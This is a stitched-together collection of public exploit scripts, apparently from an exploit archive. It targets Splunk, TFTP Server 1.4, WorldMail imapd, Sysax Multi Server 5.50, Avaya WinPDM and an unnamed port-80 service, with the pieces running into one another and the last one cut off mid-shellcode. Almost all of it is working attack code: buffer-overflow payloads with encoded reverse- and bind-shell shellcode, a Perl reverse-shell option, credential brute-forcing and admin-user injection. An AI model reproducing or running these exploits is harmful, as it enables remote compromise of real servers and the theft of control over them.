            psudoshell_req.rawpostdata("POST","search={0}&status_buckets=300&namespace=search&ui_dispatch_app=search&ui_dispatch_view=flashtimeline&auto_cancel=100&required_field_list=*&earliest_time=&latest_time=".format(attack_body))
            for c in psudoshell_req.get_cookiejar():
                if "session" in c.name:
                    psudoshell_req.add_header("X-Requested-With","XMLHttpRequest")
                    psudoshell_req.add_header("X-Splunk-Session",c.value)
            x = psudoshell_req.makerequest()
            import time
            time.sleep(3)
            print Requestobj("{0}/en-US/static/@105575/js/.tmp".format(self.splunkweb_url)).makerequest().body

    def pop_shell(self):
        "Prompt for paylod options"
        "[w00p] We appear to have access. Please select a payload"
        print "[Payload Options]"
        if self.splunkweb == 1:
            print "[1]\tPseudo Interactive Shell"
        else:
            print "[DISABLED]\tPseudo Interactive Shell"
        
        print "[2]\tPerl Reverse Shell"
        print "[3]\tCommand Exec (Blind)"
        option = input("Please select option 1-3:")
        if option == 1:
            self.search_exploit_psudoshell()
        elif option ==2:
            rev_host = raw_input("Enter Callback Host:")
            rev_port = raw_input("Enter Callback Port:")
            self.perl_revshell(rev_host,rev_port)
        elif option ==3:
            self.blind_shell()
        else:
            print "Invalid option"
            exit()


def main():

    banner = "-----==[Slunk Remote Root Exploit]=-----\n"
    parser = OptionParser(usage="Run %prog -h to see usage options",
                          version="%prog 1.0")
    parser.add_option("-t",
                      action="store",
                      dest="targethost",
                      help="IP Address or hostname of target splunk server")



    parser.add_option("-c",
                      action="store_true", # optional because action defaults to "store"
                      dest="csrf",
                      help="Generate CSRF URL only")


    parser.add_option("-f",
                      action="store_true", # optional because action defaults to "store"
                      dest="free_lic_noauth",
                      help="Target is configured to use a Free licence and does not permit remote auth")

    parser.add_option("-w",
                      action="store", # optional because action defaults to "store"
                      dest="splunkweb_port",
                      default=8000,
                      help="The Splunk admin interface port (Default: 8000)")

    parser.add_option("-d", 
                      action="store", # optional because action defaults to "store"
                      dest="splunkd_port",
                      default=8089,
                      help="The Splunkd Web API port (Default: 8089)")


    parser.add_option("-u", 
                      action="store", # optional because action defaults to "store"
                      dest="userfile",
                      help="File containing usernames for use in dictionary attack")

    parser.add_option("-p", 
                      action="store", # optional because action defaults to "store"
                      dest="passfile",
                      help="File containing passwords for use in dictionary attack")


    parser.add_option("-U", 
                      action="store", # optional because action defaults to "store"
                      dest="username",
                      help="Admin username (if known)")


    parser.add_option("-P",
                      action="store", # optional because action defaults to "store"
                      dest="password",
                      help="Admin pasword (if known)")

    parser.add_option("-e",
                     action="store", # optional because action defaults to "store"
                     dest="userpair",
                     help="Attempt to add admin user via priv up directory traversal magic. Accepts username:password")


    (options, args) = parser.parse_args()


    if not options.targethost:
        parser.error("Target host required")
        exit()

    elif options.targethost and options.free_lic_noauth:
        x = SplunkTarget(options.targethost,splunkweb_port=options.splunkweb_port,splunkd_port=options.splunkd_port)
        x.username="admin"
        x.password="admin"
        x.got_admin=1
        x.splunkd = 0
        x.pop_shell()
        
    elif options.targethost and options.csrf:
        x = SplunkTarget(options.targethost,splunkweb_port=options.splunkweb_port,splunkd_port=options.splunkd_port)
        print "[*] Enter command to run or enter 'revshell' for a perl reverse shell:"
        option = raw_input("cmd>")
        if option =="revshell":
            rev_host = raw_input("Enter Callback Host:")
            rev_port = raw_input("Enter Callback Port:")
            x.perl_revshell(rev_host,rev_port)
            print x.get_csrf_link_revshell(rev_host,rev_port)
        else:
            print x.get_csrf_link_cmd(option.strip())

    elif options.targethost and options.username and options.password and options.userpair:
        print "[i] Attemping priv up"
        if ":" in options.userpair:
            username,password = options.userpair.split(":")
        else:
            print "-e requires username password pair in format username:password"
        
        x = SplunkTarget(options.targethost,splunkweb_port=options.splunkweb_port,splunkd_port=options.splunkd_port)
        x.username= options.username
        x.password = options.password
        x.splunkd = 1
        import time
        while 1:
            sessionids= x.dump_session_ids()
            for session in sessionids:
                if x.add_admin(username,password,session):
                    print "[i] User Added"
                    exit()
            time.sleep(2)
            
    elif options.targethost and options.username and options.password:
        print "[i] Using static username and password"
        x = SplunkTarget(options.targethost,splunkweb_port=options.splunkweb_port,splunkd_port=options.splunkd_port)
        x.username= options.username
        x.password = options.password
        if x.user_is_admin(options.username,options.password):
            x.pop_shell()

    elif options.targethost and options.userfile and options.passfile:
        print "[i] Lauching bruteforce attack"
        x = SplunkTarget(options.targethost,splunkweb_port=options.splunkweb_port,splunkd_port=options.splunkd_port)
        x.account_bruteforce(options.userfile,options.passfile)
        if x.got_admin ==1:
            x.pop_shell()
        
    else:
        print "Please ensure you have supplied either a username and password or a user and password file to bruteforce"
        exit()


if __name__ == '__main__':
    main()
    
    #!/usr/bin/python

#---------------------------------------------------------------------------#
# Exploit: TFTP SERVER V1.4 ST (RRQ Overflow)                               #
# OS: Windows XP PRO SP3                                                    #
# Author: b33f                                                              #
#---------------------------------------------------------------------------#
# Smashing the stack for fun and practise...                                #
#                                                                           #
# This tftp service have been pwned extensively:                            #
# (1) Muts ==> WRQ Overflow                                                 #
#     http://www.exploit-db.com/exploits/5314/                              #
# (2) Molotov ==> WRQ Overflow                                              #
#     http://www.exploit-db.com/exploits/10542/                             #
# (3) tixxDZ ==> ERROR Overflow                                             #
#     http://www.exploit-db.com/exploits/5563/                              #
#                                                                           #
#---------------------------------------------------------------------------#
# After some simple fuzzing with spike I discovered that sending a Read     #
# Request (RRQ) packet can also trigger a buffer overflow...                #
#---------------------------------------------------------------------------#
# It might take up to 30 seconds for some reason but the shell does appear  #
# as expected....                                                           #
#                                                                           #
# root@bt:~# nc -lvp 9988                                                   #
# listening on [any] 9988 ...                                               #
# 192.168.111.128: inverse host lookup failed: Unknown server error         #
# connect to [192.168.111.132] from (UNKNOWN) [192.168.111.128] 1072        #
# Microsoft Windows XP [Version 5.1.2600]                                   #
# (C) Copyright 1985-2001 Microsoft Corp.                                   #
#                                                                           #
# C:\Program Files\TFTPServer>                                              #
#---------------------------------------------------------------------------#

import socket
import sys

host = '192.168.111.128'
port = 69

try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      
except:
      print "socket() failed"
      sys.exit(1)

#msfpayload windows/shell_reverse_tcp LHOST=192.168.111.132 LPORT=9988 R| msfencode -b '\x00'
#x86/shikata_ga_nai succeeded with size 341 (iteration=1)
shell = (
"\xbb\x3c\xef\xdb\xc5\xdb\xdd\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x4f\x31\x5a\x14\x83\xc2\x04\x03\x5a\x10\xde\x1a\x27\x2d\x97"
"\xe5\xd8\xae\xc7\x6c\x3d\x9f\xd5\x0b\x35\xb2\xe9\x58\x1b\x3f"
"\x82\x0d\x88\xb4\xe6\x99\xbf\x7d\x4c\xfc\x8e\x7e\x61\xc0\x5d"
"\xbc\xe0\xbc\x9f\x91\xc2\xfd\x6f\xe4\x03\x39\x8d\x07\x51\x92"
"\xd9\xba\x45\x97\x9c\x06\x64\x77\xab\x37\x1e\xf2\x6c\xc3\x94"
"\xfd\xbc\x7c\xa3\xb6\x24\xf6\xeb\x66\x54\xdb\xe8\x5b\x1f\x50"
"\xda\x28\x9e\xb0\x13\xd0\x90\xfc\xff\xef\x1c\xf1\xfe\x28\x9a"
"\xea\x75\x43\xd8\x97\x8d\x90\xa2\x43\x18\x05\x04\x07\xba\xed"
"\xb4\xc4\x5c\x65\xba\xa1\x2b\x21\xdf\x34\xf8\x59\xdb\xbd\xff"
"\x8d\x6d\x85\xdb\x09\x35\x5d\x42\x0b\x93\x30\x7b\x4b\x7b\xec"
"\xd9\x07\x6e\xf9\x5b\x4a\xe7\xce\x51\x75\xf7\x58\xe2\x06\xc5"
"\xc7\x58\x81\x65\x8f\x46\x56\x89\xba\x3e\xc8\x74\x45\x3e\xc0"
"\xb2\x11\x6e\x7a\x12\x1a\xe5\x7a\x9b\xcf\xa9\x2a\x33\xa0\x09"
"\x9b\xf3\x10\xe1\xf1\xfb\x4f\x11\xfa\xd1\xf9\x16\x6d\x1a\x51"
"\xf7\xea\xf2\xa0\x07\xd4\x06\x2c\xe1\x70\x17\x78\xba\xec\x8e"
"\x21\x30\x8c\x4f\xfc\xd0\x2d\xdd\x9b\x20\x3b\xfe\x33\x77\x6c"
"\x30\x4a\x1d\x80\x6b\xe4\x03\x59\xed\xcf\x87\x86\xce\xce\x06"
"\x4a\x6a\xf5\x18\x92\x73\xb1\x4c\x4a\x22\x6f\x3a\x2c\x9c\xc1"
"\x94\xe6\x73\x88\x70\x7e\xb8\x0b\x06\x7f\x95\xfd\xe6\xce\x40"
"\xb8\x19\xfe\x04\x4c\x62\xe2\xb4\xb3\xb9\xa6\xc5\xf9\xe3\x8f"
"\x4d\xa4\x76\x92\x13\x57\xad\xd1\x2d\xd4\x47\xaa\xc9\xc4\x22"
"\xaf\x96\x42\xdf\xdd\x87\x26\xdf\x72\xa7\x62")

#---------------------------------------------------------------------------#
# (1) Stage1: 0x00409605 TFTPServer.exe - PPR                               #
#             => 3-byte overwrite using the mandatory protocol null-byte.   #
# (2) Stage2: jump back 5-bytes "\xEB\xF9" so we have room for a far jump.  #
# (3) Stage3: jump back 1490-bytes to the beginning of our buffer.          #
# (4) Stage4: reverse shell port 9988 - size 341                            #
#---------------------------------------------------------------------------#

stage4 = "\x90"*50 + shell
stage3 = "\xE9\x2E\xFA\xFF\xFF"
stage2 = "\xEB\xF9\x90\x90"
stage1 = "\x05\x96\x40"

filename = stage4 + "A"*(1487-len(stage4)) + stage3 + stage2 + stage1


mode = "netascii"
youlose = "\x00\x01" + filename + "\x00" + mode + "\x00"
s.sendto(youlose, (host, port))#!/usr/bin/python
import sys
import socket

## Exploit Title: WorldMail imapd 3.0 SEH overflow (egg hunter)
## Tested on: XP SP3 en-us
## Author: TheXero
## Website: www.thexero.co.uk
## http://www.nullsecurity.net

## Check for parameters
if len(sys.argv) != 3:
	print "Usage: " + sys.argv[0] + " 127.0.0.1 143"
	quit()

## Assigns the parameters
target = sys.argv[1]
port = int(sys.argv[2])

## Sets up the socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

## Sets the variables
char = "}"
nseh = "\xeb\x06\x90\x90"
seh = "\x4e\x3b\x01\x10" ## 10013B4E  |. 59             POP ECX mailcmn.dll
buffer = '\x90' * 8
shellcode = ("T00WT00W" ## Bindshell port 4444
"\xbd\xe8\x39\x05\xa5\xdb\xdb\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x56\x31\x68\x13\x03\x68\x13\x83\xc0\xec\xdb\xf0\x59\x04\x92"
"\xfb\xa1\xd4\xc5\x72\x44\xe5\xd7\xe1\x0c\x57\xe8\x62\x40\x5b"
"\x83\x27\x71\xe8\xe1\xef\x76\x59\x4f\xd6\xb9\x5a\x61\xd6\x16"
"\x98\xe3\xaa\x64\xcc\xc3\x93\xa6\x01\x05\xd3\xdb\xe9\x57\x8c"
"\x90\x5b\x48\xb9\xe5\x67\x69\x6d\x62\xd7\x11\x08\xb5\xa3\xab"
"\x13\xe6\x1b\xa7\x5c\x1e\x10\xef\x7c\x1f\xf5\xf3\x41\x56\x72"
"\xc7\x32\x69\x52\x19\xba\x5b\x9a\xf6\x85\x53\x17\x06\xc1\x54"
"\xc7\x7d\x39\xa7\x7a\x86\xfa\xd5\xa0\x03\x1f\x7d\x23\xb3\xfb"
"\x7f\xe0\x22\x8f\x8c\x4d\x20\xd7\x90\x50\xe5\x63\xac\xd9\x08"
"\xa4\x24\x99\x2e\x60\x6c\x7a\x4e\x31\xc8\x2d\x6f\x21\xb4\x92"
"\xd5\x29\x57\xc7\x6c\x70\x30\x24\x43\x8b\xc0\x22\xd4\xf8\xf2"
"\xed\x4e\x97\xbe\x66\x49\x60\xc0\x5d\x2d\xfe\x3f\x5d\x4e\xd6"
"\xfb\x09\x1e\x40\x2d\x31\xf5\x90\xd2\xe4\x5a\xc1\x7c\x56\x1b"
"\xb1\x3c\x06\xf3\xdb\xb2\x79\xe3\xe3\x18\x0c\x23\x2a\x78\x5d"
"\xc4\x4f\x7e\x70\x48\xd9\x98\x18\x60\x8f\x33\xb4\x42\xf4\x8b"
"\x23\xbc\xde\xa7\xfc\x2a\x56\xae\x3a\x54\x67\xe4\x69\xf9\xcf"
"\x6f\xf9\x11\xd4\x8e\xfe\x3f\x7c\xd8\xc7\xa8\xf6\xb4\x8a\x49"
"\x06\x9d\x7c\xe9\x95\x7a\x7c\x64\x86\xd4\x2b\x21\x78\x2d\xb9"
"\xdf\x23\x87\xdf\x1d\xb5\xe0\x5b\xfa\x06\xee\x62\x8f\x33\xd4"
"\x74\x49\xbb\x50\x20\x05\xea\x0e\x9e\xe3\x44\xe1\x48\xba\x3b"
"\xab\x1c\x3b\x70\x6c\x5a\x44\x5d\x1a\x82\xf5\x08\x5b\xbd\x3a"
"\xdd\x6b\xc6\x26\x7d\x93\x1d\xe3\x8d\xde\x3f\x42\x06\x87\xaa"
"\xd6\x4b\x38\x01\x14\x72\xbb\xa3\xe5\x81\xa3\xc6\xe0\xce\x63"
"\x3b\x99\x5f\x06\x3b\x0e\x5f\x03")

## Calculates the size of junk depending on the shellcode
junk = "\x41" * (769 - len(shellcode))

## Egg Hunter
hunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05"
"\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

## Assembles the buffer
buffer = char + junk + shellcode + nseh + seh + hunter + char

## Connects
s.connect((target,port))
data=s.recv(1024)
s.send("a001 LIST " + buffer + "\r\n")
s.close()

#!/usr/bin/python
##########################################################################################################
#Title: Sysax Multi Server 5.50 Create Folder BOF
#Author: Craig Freyman (@cd1zz)
#Tested on: XP SP3 32bit and Server 2003 SP2 32bit(No DEP)
#Date Discovered: January 13, 2012
#Vendor Contacted: January 15, 2012
#Vendor Response: January 16, 2012
#Vendor Fix: Version 5.52 released on January 17, 2012 fixes issue
#Additional exploit details, notes and assumptions can be found here:
#http://www.pwnag3.com/2012/01/sysax-multi-server-550-exploit.html
##########################################################################################################

import socket,sys

if len(sys.argv) != 5:
    print "[+] Usage: ./filename.py <Target IP> <Port> <SID> <XP or 2K3>"
    sys.exit(1)
  
target = sys.argv[1]
port = int(sys.argv[2])
sid = sys.argv[3]
os = sys.argv[4]

if len(sid) != 40:
    print "[X] Something is wrong with your SID, it should be 40 bytes long."
    print "[X] Refer to http://www.pwnag3.com/2012/01/sysax-multi-server-550-exploit.html"
    sys.exit(1)

#msfvenom -p windows/shell_bind_tcp LPORT=4444 -e x86/shikata_ga_nai -b "\x00"
#[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)

shell = ("\xda\xdc\xd9\x74\x24\xf4\x5f\x2b\xc9\xb8\xb7\x6e\xc5\xe9" 
"\xb1\x56\x83\xc7\x04\x31\x47\x14\x03\x47\xa3\x8c\x30\x15" 
"\x23\xd9\xbb\xe6\xb3\xba\x32\x03\x82\xe8\x21\x47\xb6\x3c" 
"\x21\x05\x3a\xb6\x67\xbe\xc9\xba\xaf\xb1\x7a\x70\x96\xfc" 
"\x7b\xb4\x16\x52\xbf\xd6\xea\xa9\x93\x38\xd2\x61\xe6\x39" 
"\x13\x9f\x08\x6b\xcc\xeb\xba\x9c\x79\xa9\x06\x9c\xad\xa5" 
"\x36\xe6\xc8\x7a\xc2\x5c\xd2\xaa\x7a\xea\x9c\x52\xf1\xb4" 
"\x3c\x62\xd6\xa6\x01\x2d\x53\x1c\xf1\xac\xb5\x6c\xfa\x9e" 
"\xf9\x23\xc5\x2e\xf4\x3a\x01\x88\xe6\x48\x79\xea\x9b\x4a" 
"\xba\x90\x47\xde\x5f\x32\x0c\x78\x84\xc2\xc1\x1f\x4f\xc8" 
"\xae\x54\x17\xcd\x31\xb8\x23\xe9\xba\x3f\xe4\x7b\xf8\x1b" 
"\x20\x27\x5b\x05\x71\x8d\x0a\x3a\x61\x69\xf3\x9e\xe9\x98" 
"\xe0\x99\xb3\xf4\xc5\x97\x4b\x05\x41\xaf\x38\x37\xce\x1b" 
"\xd7\x7b\x87\x85\x20\x7b\xb2\x72\xbe\x82\x3c\x83\x96\x40" 
"\x68\xd3\x80\x61\x10\xb8\x50\x8d\xc5\x6f\x01\x21\xb5\xcf" 
"\xf1\x81\x65\xb8\x1b\x0e\x5a\xd8\x23\xc4\xed\xde\xed\x3c" 
"\xbe\x88\x0f\xc3\x51\x15\x99\x25\x3b\xb5\xcf\xfe\xd3\x77" 
"\x34\x37\x44\x87\x1e\x6b\xdd\x1f\x16\x65\xd9\x20\xa7\xa3" 
"\x4a\x8c\x0f\x24\x18\xde\x8b\x55\x1f\xcb\xbb\x1c\x18\x9c" 
"\x36\x71\xeb\x3c\x46\x58\x9b\xdd\xd5\x07\x5b\xab\xc5\x9f" 
"\x0c\xfc\x38\xd6\xd8\x10\x62\x40\xfe\xe8\xf2\xab\xba\x36" 
"\xc7\x32\x43\xba\x73\x11\x53\x02\x7b\x1d\x07\xda\x2a\xcb" 
"\xf1\x9c\x84\xbd\xab\x76\x7a\x14\x3b\x0e\xb0\xa7\x3d\x0f" 
"\x9d\x51\xa1\xbe\x48\x24\xde\x0f\x1d\xa0\xa7\x6d\xbd\x4f" 
"\x72\x36\xcd\x05\xde\x1f\x46\xc0\x8b\x1d\x0b\xf3\x66\x61" 
"\x32\x70\x82\x1a\xc1\x68\xe7\x1f\x8d\x2e\x14\x52\x9e\xda" 
"\x1a\xc1\x9f\xce")

#No DEP bypass :(
if os == "2K3":
     junk = "\x41" * 648
     jump = "\xDF\xF2\xE5\x77"	#77E5F2DF CALL ESP kernel32.dll
     buf = junk + jump + "\x90" * 10 + shell + "\x44" * 1000

if os == "XP":
     junk = "\x41" * 667
     jump = "\xF0\x69\x83\x7C" 	#7C8369F0 CALL ESP kernel32.dll
     buf = junk + jump + "\x90" * 50 + shell + "\x44" * 1000

print "================================================"
print "[*] Sysax Multi Server 5.50 Create Folder BOF"
print "[*] ------------------by cd1zz------------------"
print "[*] Launching exploit against " + target + "...."
print "================================================"

head = "POST /scgi?sid="+sid+"&pid=mk_folder2_name1.htm HTTP/1.1\r\n"
head += "Host: \r\n"
head += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:9.0.1) Gecko/20100101 Firefox/9.0.1\r\n"
head += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
head += "Accept-Language: en-us,en;q=0.5\r\n"
head += "Accept-Encoding: gzip, deflate\r\n"
head += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
head += "Proxy-Connection: keep-alive\r\n"
head += "Referer: http://"+target+"/scgi?sid="+sid+"&pid=mk_folder1_name1.htm\r\n"
head += "Content-Type: multipart/form-data; boundary=---------------------------1190753071675116720811342231\r\n"
head += "Content-Length: 171\r\n\r\n"
head += "-----------------------------1190753071675116720811342231\r\n"
head += "Content-Disposition: form-data; name=\"e2\"\r\n\r\n"
head += buf+"\r\n"
head += "-----------------------------1190753071675116720811342231--\r\n\r\n"
  
try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(head + "\r\n")
    print "[*] Payload sent!"
    print "[*] Go check your shell..."
    s.recv(1024)
    s.close()
except:
    print "[X] Meh! Fail!"




# Abysssec Public Exploit
# more info www.abysssec.com
# Avaya WinPDM UniteHostRouter  <= 3.8.2 Remote Pre-Auth Command Execute

#A boundary error in the Unite Host Router service (UniteHostRouter.exe)
#when processing certain requests can be exploited to cause a stack-based buffer
#overflow via an overly long string in the "To:" field sent to UDP port 3217.
'''


signed int __cdecl sub_403160(const char *Str, void *a2)
{
  char *v2; 
  char *v3; 
  const void *v4; 
  char *v5; 
  unsigned int v6; 
  signed int result;

  v2 = strpbrk(Str, "\n\r");
  v3 = strpbrk(Str, "/\n\r");
  if ( v3 >= v2 || (v4 = v3 + 1, v5 = strpbrk(v3 + 1, ":/? \n\r"), v5 > v2) )
  {
    result = 0;
  }
  else
  {
    v6 = v5 - v4;
    memcpy(a2, v4, v6); // vulnerable memcpy 
    *((_BYTE *)a2 + v6) = 0;
    result = 1;
  }
  return result;
}



signed int __cdecl sub_403160_patched(const char *Str, void *a2)
{
  char *v2; 
  char *v3; 
  const void *v4; 
  char *v5; 
  unsigned int v6; 
  signed int result; 

  v2 = strpbrk(Str, "\n\r");
  if ( v2
    && (v3 = strpbrk(Str, "/\n\r")) != 0
    && v3 < v2
    && (v4 = v3 + 1, (v5 = strpbrk(v3 + 1, ":/? \n\r")) != 0)
    && v5 <= v2
    && (v6 = v5 - v4, (signed int)v6 <= 256) ) // patched by checking <= 256 
  {
    memcpy(a2, v4, v6); 
    *((_BYTE *)a2 + v6) = 0;
    result = 1;
  }
  else
  {
    result = 0;
  }
  return result;
}


'''

from socket import socket, AF_INET, SOCK_DGRAM

data = '\x55\x54\x50\x2f\x31' # Protocol
data +=' To: 127.0.0.1'
data+= ' /'+"A"*260
data+= "\xFB\xF8\xAB\x71" # 71ABF8FB call esp W32_SOCK.dll

# win32_bind - EXITFUNC=thread LPORT=4444 Size=717 Encoder=PexAlphaNum
# http://metasploit.com

data += ("\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
"\x4f\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x58"
"\x4e\x56\x46\x32\x46\x32\x4b\x38\x45\x44\x4e\x43\x4b\x58\x4e\x47"
"\x45\x50\x4a\x57\x41\x50\x4f\x4e\x4b\x38\x4f\x34\x4a\x41\x4b\x58"
"\x4f\x55\x42\x52\x41\x30\x4b\x4e\x43\x4e\x42\x53\x49\x54\x4b\x38"
"\x46\x53\x4b\x58\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a"
"\x46\x58\x42\x4c\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x30"
"\x44\x4c\x4b\x4e\x46\x4f\x4b\x33\x46\x55\x46\x42\x4a\x42\x45\x57"
"\x43\x4e\x4b\x58\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x58"
"\x4e\x50\x4b\x34\x4b\x48\x4f\x55\x4e\x41\x41\x30\x4b\x4e\x43\x30"
"\x4e\x52\x4b\x48\x49\x38\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c"
"\x41\x43\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x33\x4b\x58\x42\x44"
"\x4e\x50\x4b\x38\x42\x47\x4e\x41\x4d\x4a\x4b\x48\x42\x54\x4a\x50"
"\x50\x35\x4a\x46\x50\x58\x50\x44\x50\x50\x4e\x4e\x42\x35\x4f\x4f"
"\x48\x4d\x41\x53\x4b\x4d\x48\x36\x43\x55\x48\x56\x4a\x36\x43\x33"
"\x44\x33\x4a\x56\x47\x47\x43\x47\x44\x33\x4f\x55\x46\x55\x4f\x4f"
"\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e\x4e\x4f\x4b\x53\x42\x45\x4f\x4f"
"\x48\x4d\x4f\x35\x49\x48\x45\x4e\x48\x56\x41\x48\x4d\x4e\x4a\x50"
"\x44\x30\x45\x55\x4c\x46\x44\x50\x4f\x4f\x42\x4d\x4a\x36\x49\x4d"
"\x49\x50\x45\x4f\x4d\x4a\x47\x55\x4f\x4f\x48\x4d\x43\x45\x43\x45"
"\x43\x55\x43\x55\x43\x45\x43\x34\x43\x45\x43\x34\x43\x35\x4f\x4f"
"\x42\x4d\x48\x56\x4a\x56\x41\x41\x4e\x35\x48\x36\x43\x35\x49\x38"
"\x41\x4e\x45\x49\x4a\x46\x46\x4a\x4c\x51\x42\x57\x47\x4c\x47\x55"
"\x4f\x4f\x48\x4d\x4c\x36\x42\x31\x41\x45\x45\x35\x4f\x4f\x42\x4d"
"\x4a\x36\x46\x4a\x4d\x4a\x50\x42\x49\x4e\x47\x55\x4f\x4f\x48\x4d"
"\x43\x35\x45\x35\x4f\x4f\x42\x4d\x4a\x36\x45\x4e\x49\x44\x48\x38"
"\x49\x54\x47\x55\x4f\x4f\x48\x4d\x42\x55\x46\x35\x46\x45\x45\x35"
"\x4f\x4f\x42\x4d\x43\x49\x4a\x56\x47\x4e\x49\x37\x48\x4c\x49\x37"
"\x47\x45\x4f\x4f\x48\x4d\x45\x55\x4f\x4f\x42\x4d\x48\x36\x4c\x56"
"\x46\x46\x48\x36\x4a\x46\x43\x56\x4d\x56\x49\x38\x45\x4e\x4c\x56"
"\x42\x55\x49\x55\x49\x52\x4e\x4c\x49\x48\x47\x4e\x4c\x36\x46\x54"
"\x49\x58\x44\x4e\x41\x43\x42\x4c\x43\x4f\x4c\x4a\x50\x4f\x44\x54"
"\x4d\x32\x50\x4f\x44\x54\x4e\x52\x43\x49\x4d\x58\x4c\x47\x4a\x53"
"\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x46\x44\x57\x50\x4f\x43\x4b\x48\x51"
"\x4f\x4f\x45\x57\x46\x54\x4f\x4f\x48\x4d\x4b\x45\x47\x35\x44\x35"
"\x41\x35\x41\x55\x41\x35\x4c\x46\x41\x50\x41\x35\x41\x45\x45\x35"
"\x41\x45\x4f\x4f\x42\x4d\x4a\x56\x4d\x4a\x49\x4d\x45\x30\x50\x4c"
"\x43\x35\x4f\x4f\x48\x4d\x4c\x56\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f"
"\x42\x4d\x4b\x58\x47\x45\x4e\x4f\x43\x38\x46\x4c\x46\x36\x4f\x4f"
"\x48\x4d\x44\x55\x4f\x4f\x42\x4d\x4a\x36\x4f\x4e\x50\x4c\x42\x4e"
"\x42\x36\x43\x55\x4f\x4f\x48\x4d\x4f\x4f\x42\x4d\x5a")

data += '\r\n\r\n' #\n\n

port = 3217
hostname = '192.168.171.129'
udp = socket(AF_INET,SOCK_DGRAM)
udp.sendto(data, (hostname, port))

print "Send malicius packet\n"
print "You Should Got a shell at %s 4444" % hostname
#!/usr/bin/python
import socket

target_address="10.10.10.129"
target_port=80

buffer2 = "R0cX" + "R0cX" 
# msfpayload windows/shell_bind_tcp LPORT=4444 R | msfencode -e x86/shikata_ga_nai -c 4 -t c
buffer2 += ("\xbd\xec\x37\x93\x4b\xdb\xcf\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x6a\x83\xc0\x04\x31\x68\x10\x03\x68\x10\x0e\xc2\x4a\xa1\x17"
"\x59\x49\xc2\xff\x91\x58\x90\x5d\x29\xec\xb0\x10\xb1\x92\xd3"
"\xae\x07\xc5\x35\x4d\x38\xf3\xdb\x06\xfc\xec\x5f\xa5\x66\x93"
"\xcc\x5d\x07\x81\xcb\xcc\x59\x35\x45\xd6\x2d\x15\xa1\xe7\xbb"
"\xd6\x5d\x68\x57\x1b\x2a\x4f\xe8\xdd\xd3\xc0\x84\x0c\x0e\xb7"
"\x03\x24\xc7\xfd\xd2\xa5\x88\x89\xf8\x07\x82\x1b\xcb\x2d\x3b"
"\xfd\x9d\x67\xa9\xff\xe9\x20\x9e\xa9\x25\x8b\x7c\xda\xd9\x01"
"\x32\x51\x36\x9a\xe7\x73\x8f\xe5\xea\x60\xa6\x4c\x78\xef\xbb"
"\x1e\x37\xd0\xbd\xaa\x4f\xe7\x94\x3e\x02\x34\x21\xc6\xc1\xe2"
"\xa3\x6f\x76\x92\x9a\xed\xda\x19\x2d\xca\x21\xb2\xb0\xa9\xb5"
"\x72\xa1\xbb\xd0\x18\x64\xd3\xb4\x85\x0c\x92\xf7\x07\xcf\x13"
"\xc2\x95\x57\x0a\x68\x6d\x94\x6f\x5a\xad\xd1\x82\x26\x9f\x3c"
"\x0d\x2b\xdc\x06\x6a\xd3\x87\x24\x9c\x14\x58\x71\x42\xef\x1b"
"\x90\xdc\x46\x67\x51\xd3\x4c\xc4\x11\x23\x29\xbd\xc5\xab\x96"
"\x54\x5e\xb6\x08\x60\x42\x5f\x7a\x76\xdf\x30\x05\x76\xb7\xd1"
"\xf2\x49\xba\x14\x69\xa7\x7b\xa8\x6b\xb9\xad\xc8\x8e\x0f\x9e"
"\x07\x7f\xa7\x89\x9b\x4d\x68\xbd\x45\x77\xe0\x64\xec\xa2\x18"
"\x2d\x6f\x10\xc3\x14\x1d\x4e\x92\x3a\x8a\xf0\xd8\x07\x12\x19"
"\x27\x0c\x23\xe4\x0b\xbb\x6d\x97\xf8\xe8\x8c\x23\xb5\xe0\x22"
"\xe8\x70\x85\x10\xbb\x64\xbe\x09\x41\xe7\x2d\x6d\x39\xfb\xcc"
"\x09\xee\xca\x8f\x83\x22\x5d\x77\x2b\x5b\xc6\x1b\x82\x6e\x17"
"\x03\xe8\x6c\x35\x55\x71\xd4\x35\x72\x12\x3f\x11\x6e\xcf\x09"
"\x5a\xd0\x33\x40\x8e\x3f\x36\xbf\xd7\xd0\x85\x17\x03\xd3\xc4"
"\x7f\x17\x6e\xe8\x0d\xa6\x5f\x9e\xd6\x1b\xf4\x2b\x8c\xb3\xad"
"\x19\xb3\x70\xac\x56\x76\x0c\xfb\x4f\xc4\x99\xdd\x99\x75\x8f"
"\xa8\xfa\x91\x5c\xfb\x26\xbd\x8a\xea\xec\x0d\xf1\x45\x4f\x72"
"\xd1\x02\x47\x9c\xa5\x33\x1e\xf8\xc7\x00\xd2\x3d\x86\xb4\x7c"
